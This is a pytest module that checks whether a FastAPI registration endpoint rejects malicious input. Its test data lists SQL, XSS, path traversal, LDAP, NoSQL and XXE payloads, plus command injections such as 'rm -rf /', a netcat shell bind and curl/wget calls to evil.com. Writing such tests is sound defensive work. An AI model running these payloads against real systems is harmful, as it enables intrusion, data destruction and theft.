"""Tests for input validation and security measures.

This module tests various input validation scenarios and security measures
to prevent common vulnerabilities like injection attacks, XSS, and data corruption.
"""

from fastapi.testclient import TestClient


class TestInputValidation:
    """Test input validation across all endpoints."""

    def test_username_validation(self, client: TestClient, clean_databases):
        """Test username validation with various inputs."""
        # Valid usernames
        valid_usernames = [
            "testuser",
            "test_user",
            "test-user",
            "test123",
            "TestUser",
            "test.user",
        ]

        for username in valid_usernames:
            user_data = {
                "username": username,
                "email": "test@example.com",
                "password": "testpassword123",
                "full_name": "Test User",
            }
            response = client.post("/api/auth/register", json=user_data)
            # Should succeed or fail due to duplicate username, not validation
            assert response.status_code in [200, 400]
            if response.status_code == 400:
                assert "Username already registered" in response.json()["detail"]

    def test_username_injection_attempts(self, client: TestClient, clean_databases):
        """Test username field against injection attempts."""
        malicious_usernames = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "admin' OR '1'='1",
            "../../etc/passwd",
            "test\x00user",
            "test\nuser",
            "test\tuser",
            "test\ruser",
            "test\buser",
            "test\fuser",
            "test\vuser",
        ]

        for username in malicious_usernames:
            user_data = {
                "username": username,
                "email": "test@example.com",
                "password": "testpassword123",
                "full_name": "Test User",
            }
            response = client.post("/api/auth/register", json=user_data)
            # Should fail validation or be blocked by security middleware
            assert response.status_code in [422, 400, 403]

    def test_email_validation(self, client: TestClient, clean_databases):
        """Test email validation with various inputs."""
        # Valid emails
        valid_emails = [
            "test@example.com",
            "user.name@domain.co.uk",
            "test+tag@example.org",
            "123@test.com",
        ]

        for email in valid_emails:
            user_data = {
                "username": f"testuser_{email.split('@')[0]}",
                "email": email,
                "password": "testpassword123",
                "full_name": "Test User",
            }
            response = client.post("/api/auth/register", json=user_data)
            assert response.status_code in [200, 400]

    def test_email_injection_attempts(self, client: TestClient, clean_databases):
        """Test email field against injection attempts."""
        malicious_emails = [
            "test@example.com'; DROP TABLE users; --",
            "<script>alert('xss')</script>@example.com",
            "test@example.com\"><script>alert('xss')</script>",
            "test@example.com\x00",
            "test@example.com\n",
            "test@example.com\t",
            "test@example.com\r",
        ]

        for email in malicious_emails:
            user_data = {
                "username": f"testuser_{len(email)}",
                "email": email,
                "password": "testpassword123",
                "full_name": "Test User",
            }
            response = client.post("/api/auth/register", json=user_data)
            # Should fail validation
            assert response.status_code in [422, 400, 403]

    def test_password_validation(self, client: TestClient, clean_databases):
        """Test password validation with various inputs."""
        # Valid passwords
        valid_passwords = [
            "testpassword123",
            "TestPassword123!",
            "MySecure@Pass123",
            "1234567890abcdef",
        ]

        for password in valid_passwords:
            user_data = {
                "username": f"testuser_{len(password)}",
                "email": f"test{len(password)}@example.com",
                "password": password,
                "full_name": "Test User",
            }
            response = client.post("/api/auth/register", json=user_data)
            assert response.status_code in [200, 400]

    def test_password_injection_attempts(self, client: TestClient, clean_databases):
        """Test password field against injection attempts."""
        malicious_passwords = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "password\x00",
            "password\n",
            "password\t",
            "password\r",
            "password\b",
            "password\f",
            "password\v",
        ]

        for password in malicious_passwords:
            user_data = {
                "username": f"testuser_{len(password)}",
                "email": f"test{len(password)}@example.com",
                "password": password,
                "full_name": "Test User",
            }
            response = client.post("/api/auth/register", json=user_data)
            # Should fail validation or be handled securely
            assert response.status_code in [422, 400]

    def test_full_name_validation(self, client: TestClient, clean_databases):
        """Test full name validation with various inputs."""
        # Valid names
        valid_names = [
            "Test User",
            "Test-User",
            "Test_User",
            "Test O'User",
            'Test "User"',
            "Test & User",
            "Test + User",
            "Test = User",
            "Test (User)",
            "Test [User]",
            "Test {User}",
            "Test | User",
            "Test \\ User",
            "Test / User",
            "Test ? User",
            "Test ! User",
            "Test @ User",
            "Test # User",
            "Test $ User",
            "Test % User",
            "Test ^ User",
            "Test * User",
            "Test ~ User",
            "Test ` User",
            "Test < User",
            "Test > User",
            "Test , User",
            "Test . User",
            "Test : User",
            "Test ; User",
            "Test ' User",
            'Test " User',
        ]

        for name in valid_names:
            user_data = {
                "username": f"testuser_{len(name)}",
                "email": f"test{len(name)}@example.com",
                "password": "testpassword123",
                "full_name": name,
            }
            response = client.post("/api/auth/register", json=user_data)
            assert response.status_code in [200, 400]

    def test_full_name_injection_attempts(self, client: TestClient, clean_databases):
        """Test full name field against injection attempts."""
        malicious_names = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "Test\x00User",
            "Test\nUser",
            "Test\tUser",
            "Test\rUser",
            "Test\bUser",
            "Test\fUser",
            "Test\vUser",
        ]

        for name in malicious_names:
            user_data = {
                "username": f"testuser_{len(name)}",
                "email": f"test{len(name)}@example.com",
                "password": "testpassword123",
                "full_name": name,
            }
            response = client.post("/api/auth/register", json=user_data)
            # Should fail validation or be blocked by security middleware
            assert response.status_code in [422, 400, 403]

    def test_unicode_input_handling(self, client: TestClient, clean_databases):
        """Test handling of unicode characters in input fields."""
        unicode_inputs = [
            "测试用户",  # Chinese
            "тест",  # Cyrillic
            "テスト",  # Japanese
            "اختبار",  # Arabic
            "בדיקה",  # Hebrew
            "ทดสอบ",  # Thai
            "🎭",  # Emoji
            "café",  # Accented characters
            "naïve",  # Accented characters
            "résumé",  # Accented characters
        ]

        for unicode_input in unicode_inputs:
            user_data = {
                "username": f"testuser_{len(unicode_input)}",
                "email": f"test{len(unicode_input)}@example.com",
                "password": "testpassword123",
                "full_name": unicode_input,
            }
            response = client.post("/api/auth/register", json=user_data)
            # Should handle unicode properly
            assert response.status_code in [200, 400, 422]

    def test_very_long_inputs(self, client: TestClient, clean_databases):
        """Test handling of very long input strings."""
        # Very long strings (10KB each)
        long_string = "x" * 10000

        user_data = {
            "username": long_string,
            "email": f"{long_string}@example.com",
            "password": long_string,
            "full_name": long_string,
        }

        response = client.post("/api/auth/register", json=user_data)
        # Should handle long inputs appropriately (likely fail validation)
        assert response.status_code in [422, 400, 403, 413]

    def test_null_byte_injection(self, client: TestClient, clean_databases):
        """Test null byte injection attempts."""
        null_byte_inputs = [
            "test\x00user",
            "test@example.com\x00",
            "testpassword\x00123",
            "Test\x00User",
        ]

        for i, null_input in enumerate(null_byte_inputs):
            user_data = {
                "username": f"testuser_{i}",
                "email": f"test{i}@example.com",
                "password": "testpassword123",
                "full_name": null_input,
            }
            response = client.post("/api/auth/register", json=user_data)
            # Should handle null bytes securely
            assert response.status_code in [422, 400]

    def test_json_injection_attempts(self, client: TestClient, clean_databases):
        """Test JSON injection attempts."""
        malicious_json = {
            "username": "testuser",
            "email": "test@example.com",
            "password": "testpassword123",
            "full_name": "Test User",
            "malicious_field": "<script>alert('xss')</script>",
            "__proto__": {"isAdmin": True},
            "constructor": {"prototype": {"isAdmin": True}},
        }

        response = client.post("/api/auth/register", json=malicious_json)
        # Should ignore extra fields and handle malicious content
        assert response.status_code in [200, 400, 422]

    def test_sql_injection_attempts(self, client: TestClient, clean_databases):
        """Test SQL injection attempts in various fields."""
        sql_injections = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "admin'/*",
            "' OR 1=1 --",
            "'; INSERT INTO users VALUES ('hacker', 'hacker@evil.com', 'password'); --",
        ]

        for i, injection in enumerate(sql_injections):
            user_data = {
                "username": f"testuser_{i}",
                "email": f"test{i}@example.com",
                "password": "testpassword123",
                "full_name": injection,
            }
            response = client.post("/api/auth/register", json=user_data)
            # Should handle SQL injection attempts securely
            assert response.status_code in [422, 400]

    def test_xss_attempts(self, client: TestClient, clean_databases):
        """Test XSS attempts in various fields."""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "<iframe src=javascript:alert('xss')></iframe>",
            "<body onload=alert('xss')>",
            "<input onfocus=alert('xss') autofocus>",
            "<select onfocus=alert('xss') autofocus>",
            "<textarea onfocus=alert('xss') autofocus>",
            "<keygen onfocus=alert('xss') autofocus>",
            "<video><source onerror=alert('xss')>",
            "<audio src=x onerror=alert('xss')>",
            "<details open ontoggle=alert('xss')>",
            "<marquee onstart=alert('xss')>",
            "<math><mi//xlink:href=data:x,<script>alert('xss')</script>",
        ]

        for i, payload in enumerate(xss_payloads):
            user_data = {
                "username": f"testuser_{i}",
                "email": f"test{i}@example.com",
                "password": "testpassword123",
                "full_name": payload,
            }
            response = client.post("/api/auth/register", json=user_data)
            # Should handle XSS attempts securely
            assert response.status_code in [422, 400]

    def test_path_traversal_attempts(self, client: TestClient, clean_databases):
        """Test path traversal attempts."""
        path_traversal_payloads = [
            "../../etc/passwd",
            "..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
        ]

        for i, payload in enumerate(path_traversal_payloads):
            user_data = {
                "username": f"testuser_{i}",
                "email": f"test{i}@example.com",
                "password": "testpassword123",
                "full_name": payload,
            }
            response = client.post("/api/auth/register", json=user_data)
            # Should handle path traversal attempts securely
            assert response.status_code in [422, 400]

    def test_command_injection_attempts(self, client: TestClient, clean_databases):
        """Test command injection attempts."""
        command_injections = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "|| id",
            "`whoami`",
            "$(whoami)",
            "; rm -rf /",
            "| nc -l -p 4444 -e /bin/sh",
            "&& curl http://evil.com/steal",
            "|| wget http://evil.com/steal",
        ]

        for i, injection in enumerate(command_injections):
            user_data = {
                "username": f"testuser_{i}",
                "email": f"test{i}@example.com",
                "password": "testpassword123",
                "full_name": injection,
            }
            response = client.post("/api/auth/register", json=user_data)
            # Should handle command injection attempts securely
            assert response.status_code in [422, 400]

    def test_ldap_injection_attempts(self, client: TestClient, clean_databases):
        """Test LDAP injection attempts."""
        ldap_injections = [
            "*",
            "*)(uid=*",
            "*)(|(uid=*",
            "*))(|(uid=*",
            "*))(|(objectClass=*",
            "*))(|(objectClass=user",
            "*))(|(objectClass=person",
            "*))(|(objectClass=organizationalPerson",
            "*))(|(objectClass=inetOrgPerson",
        ]

        for i, injection in enumerate(ldap_injections):
            user_data = {
                "username": f"testuser_{i}",
                "email": f"test{i}@example.com",
                "password": "testpassword123",
                "full_name": injection,
            }
            response = client.post("/api/auth/register", json=user_data)
            # Should handle LDAP injection attempts securely
            assert response.status_code in [422, 400]

    def test_xml_injection_attempts(self, client: TestClient, clean_databases):
        """Test XML injection attempts."""
        xml_injections = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/steal">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://evil.com/steal">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://evil.com/steal">]><foo>&xxe;</foo>',
        ]

        for i, injection in enumerate(xml_injections):
            user_data = {
                "username": f"testuser_{i}",
                "email": f"test{i}@example.com",
                "password": "testpassword123",
                "full_name": injection,
            }
            response = client.post("/api/auth/register", json=user_data)
            # Should handle XML injection attempts securely
            assert response.status_code in [422, 400]

    def test_no_sql_injection_attempts(self, client: TestClient, clean_databases):
        """Test NoSQL injection attempts."""
        nosql_injections = [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '{"$where": "this.username == \'admin\'"}',
            '{"$or": [{"username": "admin"}, {"username": "testuser"}]}',
            '{"$and": [{"username": {"$ne": null}}, {"password": {"$ne": null}}]}',
            '{"$nor": [{"username": "admin"}]}',
            '{"$not": {"username": "admin"}}',
            '{"$all": ["admin", "testuser"]}',
            '{"$in": ["admin", "testuser"]}',
            '{"$nin": ["admin", "testuser"]}',
            '{"$exists": true}',
            '{"$type": "string"}',
            '{"$size": 0}',
            '{"$mod": [10, 0]}',
        ]

        for i, injection in enumerate(nosql_injections):
            user_data = {
                "username": f"testuser_{i}",
                "email": f"test{i}@example.com",
                "password": "testpassword123",
                "full_name": injection,
            }
            response = client.post("/api/auth/register", json=user_data)
            # Should handle NoSQL injection attempts securely
            assert response.status_code in [422, 400]
